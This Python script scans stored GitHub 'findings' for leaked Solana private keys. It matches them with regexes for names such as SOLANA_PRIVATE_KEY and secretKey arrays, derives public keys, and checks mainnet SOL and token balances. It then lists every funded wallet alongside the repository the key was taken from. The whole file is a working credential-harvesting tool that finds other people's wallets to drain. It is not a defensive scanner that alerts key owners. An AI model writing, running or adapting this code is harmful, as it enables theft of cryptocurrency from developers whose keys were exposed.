#!/usr/bin/env python3
"""
Extract Solana private keys from findings, derive public key, check SOL balance.
Handles two formats:
  1. Base58 encoded 64-byte keypair (87-88 chars, base58 charset)
  2. JSON uint8 array [b0,b1,...,b63] — Solana CLI id.json / keypair.json format
"""
import json, glob, re, urllib.request, urllib.error, time, struct

# base58 decode table — Solana base58 alphabet (no 0, O, I, l)
B58_ALPHA = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
B58_MAP = {c: i for i, c in enumerate(B58_ALPHA)}

def b58decode(s):
    n = 0
    for c in s:
        if c not in B58_MAP:
            raise ValueError('invalid base58 char: ' + c)
        n = n * 58 + B58_MAP[c]
    result = []
    while n > 0:
        result.append(n & 0xff)
        n >>= 8
    # leading 1s = leading zero bytes
    for c in s:
        if c == '1':
            result.append(0)
        else:
            break
    return bytes(reversed(result))

def b58encode(data):
    n = int.from_bytes(data, 'big')
    result = []
    while n > 0:
        result.append(B58_ALPHA[n % 58])
        n //= 58
    for b in data:
        if b == 0:
            result.append('1')
        else:
            break
    return ''.join(reversed(result))

# Regex: base58 Solana keypair (87-88 chars, no 0/O/I/l)
SOL_B58_RE = re.compile(
    r'(?:SOLANA_PRIVATE_KEY|SOL_PRIVATE_KEY|ANCHOR_WALLET|DEPLOYER_PRIVATE_KEY'
    r'|PAYER_PRIVATE_KEY|WALLET_KEYPAIR|SOLANA_KEYPAIR|PUMP_WALLET|SNIPER_WALLET'
    r'|BOT_WALLET|OPERATOR_KEY|PRIVATE_KEY_BASE58)\s*[=:"\s]+([1-9A-HJ-NP-Za-km-z]{87,88})',
    re.IGNORECASE
)
# Regex: JSON array of 64 uint8 values (secretKey in keypair.json)
SOL_ARR_RE = re.compile(
    r'"(?:secretKey|privateKey)"\s*:\s*\[(\d{1,3}(?:,\s*\d{1,3}){63})\]'
    r'|(?:KEYPAIR|WALLET_BYTES)\s*=\s*\[(\d{1,3}(?:,\s*\d{1,3}){63})\]',
    re.IGNORECASE
)

SOL_RPC = 'https://api.mainnet-beta.solana.com'

fake = ['xxxx','test','example','dummy','placeholder','1111','2222','3333','4444']
def is_fake(s):
    sl = s.lower()
    return any(p in sl for p in fake) or len(set(s)) < 8

def get_balance(pubkey_b58):
    body = json.dumps({
        'jsonrpc': '2.0', 'id': 1,
        'method': 'getBalance',
        'params': [pubkey_b58, {'commitment': 'confirmed'}]
    }).encode()
    req = urllib.request.Request(SOL_RPC, data=body, headers={
        'Content-Type': 'application/json',
        'User-Agent': 'curl/7.0'
    })
    try:
        r = urllib.request.urlopen(req, timeout=10)
        data = json.loads(r.read())
        lamports = data.get('result', {}).get('value', 0)
        return lamports / 1e9  # SOL
    except:
        return None

def get_token_accounts(pubkey_b58):
    """Check for SPL token balances (USDC, USDT, etc.)"""
    body = json.dumps({
        'jsonrpc': '2.0', 'id': 1,
        'method': 'getTokenAccountsByOwner',
        'params': [pubkey_b58, {'programId': 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'},
                   {'encoding': 'jsonParsed'}]
    }).encode()
    req = urllib.request.Request(SOL_RPC, data=body, headers={
        'Content-Type': 'application/json',
        'User-Agent': 'curl/7.0'
    })
    try:
        r = urllib.request.urlopen(req, timeout=10)
        data = json.loads(r.read())
        accounts = data.get('result', {}).get('value', [])
        tokens = []
        for acc in accounts:
            info = acc.get('account', {}).get('data', {}).get('parsed', {}).get('info', {})
            amt = info.get('tokenAmount', {})
            ui = float(amt.get('uiAmount') or 0)
            if ui > 0:
                mint = info.get('mint', '?')
                tokens.append((mint[:8] + '...', ui))
        return tokens
    except:
        return []

def keypair_to_pubkey(keypair_bytes):
    """Public key = last 32 bytes of the 64-byte keypair."""
    if len(keypair_bytes) != 64:
        return None
    pubkey = keypair_bytes[32:]
    return b58encode(pubkey)

seen_keys = set()
found = []

for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            url = e.get('url', '')
            content_hint = ' '.join(e.get('secrets', []))

            keypair_bytes = None

            # Try base58 format from stored secrets
            m = SOL_B58_RE.search(content_hint)
            if m:
                val = m.group(1)
                if not is_fake(val) and val not in seen_keys:
                    seen_keys.add(val)
                    try:
                        kb = b58decode(val)
                        if len(kb) == 64:
                            keypair_bytes = kb
                    except:
                        pass

            # Try JSON array format from stored secrets
            if not keypair_bytes:
                m2 = SOL_ARR_RE.search(content_hint)
                if m2:
                    arr_str = m2.group(1) or m2.group(2)
                    arr = [int(x.strip()) for x in arr_str.split(',')]
                    if len(arr) == 64:
                        kb = bytes(arr)
                        arr_id = str(arr[:4])
                        if arr_id not in seen_keys:
                            seen_keys.add(arr_id)
                            keypair_bytes = kb

            if not keypair_bytes:
                continue

            pubkey = keypair_to_pubkey(keypair_bytes)
            if not pubkey:
                continue

            sol = get_balance(pubkey)
            time.sleep(0.3)

            if sol is None:
                print('RPC_ERR | ' + e['repo'] + '/' + e['path'])
                continue

            if sol > 0:
                tokens = get_token_accounts(pubkey)
                time.sleep(0.3)
                print('*** SOL FUNDED *** ' + str(round(sol, 6)) + ' SOL | ' + pubkey[:16] + '...')
                print('  repo: ' + e['repo'] + '/' + e['path'])
                if tokens:
                    for mint, amt in tokens:
                        print('  token: ' + mint + ' = ' + str(amt))
                found.append({
                    'pubkey': pubkey, 'sol': sol, 'tokens': tokens,
                    'repo': e['repo'] + '/' + e['path']
                })
            else:
                print('zero | ' + pubkey[:16] + '... | ' + e['repo'])

        except Exception as ex:
            pass

print('\n=== ' + str(len(found)) + ' FUNDED SOLANA WALLETS ===')
for w in found:
    print('  ' + str(round(w['sol'], 4)) + ' SOL | ' + w['pubkey'])
    print('  ' + w['repo'])
    if w['tokens']:
        for mint, amt in w['tokens']:
            print('    ' + mint + ' = ' + str(amt))
